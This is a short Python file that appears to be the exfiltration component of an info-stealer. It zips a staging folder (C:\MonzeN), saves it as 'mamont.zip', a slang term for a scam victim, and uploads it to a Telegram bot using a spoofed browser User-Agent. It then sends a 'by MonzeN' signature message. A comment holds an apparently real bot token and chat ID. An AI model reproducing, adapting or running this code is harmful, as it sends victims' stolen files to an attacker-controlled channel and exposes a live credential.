import shutil
import requests

#Sender.sender("5311713070:AAFPZ_We4fMIqVcvk6juLGcTs4GaIEYFe10", "1434743208")

class Sender:
    def sender(token, chat_id):

        source_folder = r'C:\MonzeN'
        output_path = r'C:\asd\mamont'
        shutil.make_archive(output_path, 'zip', source_folder)
        url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}' # ссылка на отправку сообщения


        try:
            with requests.Session() as session:
                session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                session.post(url,files={"document": open(r'C:\asd\mamont.zip', 'rb')})
        except Exception as e:
            print(e)

        try:
            with requests.Session() as session:
                session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                session.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&parse_mode=html&text="+'by MonzeN')
        except:
            pass

